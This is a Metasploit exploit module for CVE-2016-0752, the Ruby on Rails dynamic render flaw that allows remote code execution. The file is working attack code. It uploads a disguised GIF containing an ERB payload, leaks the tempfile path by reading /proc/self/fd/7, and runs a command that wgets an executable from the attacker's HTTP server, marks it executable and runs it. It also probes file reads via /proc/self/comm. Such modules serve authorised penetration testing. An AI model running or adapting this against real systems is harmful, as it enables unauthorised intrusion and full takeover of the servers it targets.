require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Ruby on Rails Dynamic Render File Upload Remote Code Execution',
      'Description'    => %q{
        This module exploits a remote code execution vulnerability in the explicit render
        method when leveraging user parameters.
        This module has been tested across multiple versions of Ruby on Rails.
        The technique used by this module requires the specified
        endpoint to be using dynamic render paths, such as the following example:

        def show
          render params[:id]
        end

        Also, the vulnerable target will need a POST endpoint for the TempFile upload, this
        can literally be any endpoint. This module doesnt use the log inclusion method of
        exploitation due to it not being universal enough. Instead, a new code injection
        technique was found and used whereby an attacker can upload temporary image files
        against any POST endpoint and use them for the inclusion attack. Finally, you only
        get one shot at this if you are testing with the builtin rails server, use caution.
      },
      'Author'         =>
        [
          'mr_me <mr_me@offensive-security.com>',      # necromanced old bug & discovered new vector rce vector
          'John Poulin (forced-request)'               # original render bug finder
        ],
      'References'  =>
        [
          [ 'CVE', '2016-0752'],
          [ 'URL', 'https://groups.google.com/forum/#!topic/rubyonrails-security/335P1DcLG00'],        # rails patch
          [ 'URL', 'https://nvisium.com/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752/'],  # John Poulin CVE-2016-0752 patched in 5.0.0.beta1.1 - January 25, 2016
          [ 'URL', 'https://gist.github.com/forced-request/5158759a6418e6376afb'],                     # John's original exploit
        ],
      'License'        => MSF_LICENSE,
      'Platform'    => ['linux', 'bsd'],
      'Arch'        => ARCH_X86,
      'Payload'        =>
        {
          'DisableNops' => true,
        },
      'Privileged'     => false,
      'Targets'     =>
        [
          [ 'Ruby on Rails 4.0.8 July 2, 2014', {} ]                                                   # Other versions are also affected
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Oct 16 2016'))
    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('URIPATH', [ true, 'The path to the vulnerable route', "/users"]),
        OptPort.new('SRVPORT', [ true, 'The daemon port to listen on', 1337 ]),
      ], self.class)
  end

  def check

    # this is the check for the dev environment
    res = send_request_cgi({
      'uri'       =>  normalize_uri(datastore['URIPATH'], "%2f"),
      'method'    =>  'GET',
    }, 60)

    # if the page controller is dynamically rendering, its for sure vuln
    if res and res.body =~ /render params/
      return CheckCode::Vulnerable
    end

    # this is the check for the prod environment
    res = send_request_cgi({
      'uri'       =>  normalize_uri(datastore['URIPATH'], "%2fproc%2fself%2fcomm"),
      'method'    =>  'GET',
    }, 60)

    # if we can read files, its likley we can execute code
    if res and res.body =~ /ruby/
      return CheckCode::Appears
    end
    return CheckCode::Safe
  end

  def on_request_uri(cli, request)
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  def send_payload
    @bd = rand_text_alpha(8+rand(8))
    fn  = rand_text_alpha(8+rand(8))
    un  = rand_text_alpha(8+rand(8))
    pn  = rand_text_alpha(8+rand(8))
    register_file_for_cleanup("/tmp/#{@bd}")
    cmd  = "wget #{@service_url} -O /tmp/#{@bd};"
    cmd << "chmod 755 /tmp/#{@bd};"
    cmd << "/tmp/#{@bd}"
    pay = "<%=`#{cmd}`%>"
    print_status("uploading image...")
    data = Rex::MIME::Message.new
    data.add_part(pay, nil, nil, 'form-data; name="#{un}"; filename="#{fn}.gif"')
    res = send_request_cgi({
      'method' => 'POST',
      'cookie' => @cookie,
      'uri'    => normalize_uri(datastore['URIPATH'], pn),
      'ctype'  => "multipart/form-data; boundary=#{data.bound}",
      'data'   => data.to_s
    })
    if res and res.code == 422 and res.body =~ /Tempfile:\/(.*)>/
      @path = "#{$1}" if res.body =~ /Tempfile:\/(.*)>/
      return true
    else

      # this is where we pull the log file
      if leak_log
        return true
      end
    end
    return false
  end

  def leak_log

    # path to the log /proc/self/fd/7
    # this bypasses the extension check
    res = send_request_cgi({
      'uri'       =>  normalize_uri(datastore['URIPATH'], "proc%2fself%2ffd%2f7"),
      'method'    =>  'GET',
    }, 60)

    if res and res.code == 200 and res.body =~ /Tempfile:\/(.*)>, @original_filename=/
      @path = "#{$1}" if res.body =~ /Tempfile:\/(.*)>, @original_filename=/
      return true
    end
    return false
  end

  def start_http_server
    @pl = generate_payload_exe
    @elf_sent = false
    downfile = rand_text_alpha(8+rand(8))
    resource_uri = '/' + downfile
    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
      srv_host = datastore['URIHOST'] || Rex::Socket.source_address(rhost)
    else
      srv_host = datastore['SRVHOST']
    end

    # do not use SSL for the attacking web server
    if datastore['SSL']
      ssl_restore = true
      datastore['SSL'] = false
    end

    @service_url = "http://#{srv_host}:#{datastore['SRVPORT']}#{resource_uri}"
    service_url_payload = srv_host + resource_uri
    print_status("#{rhost}:#{rport} - Starting up our web service on #{@service_url} ...")
    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
        on_request_uri(cli, req)
      },
      'Path' => resource_uri
    }})
    datastore['SSL'] = true if ssl_restore
    connect
  end

  def render_tmpfile
    @path.gsub!(/\//, '%2f')
    res = send_request_cgi({
      'uri'       =>  normalize_uri(datastore['URIPATH'], @path),
      'method'    =>  'GET',
    }, 1)
  end

  def exploit
      print_status("Sending initial request to detect exploitability")
      start_http_server
      if send_payload
        print_good("injected payload")
        render_tmpfile

        # we need to delay, for the stager
        select(nil, nil, nil, 5)
      end
  end
end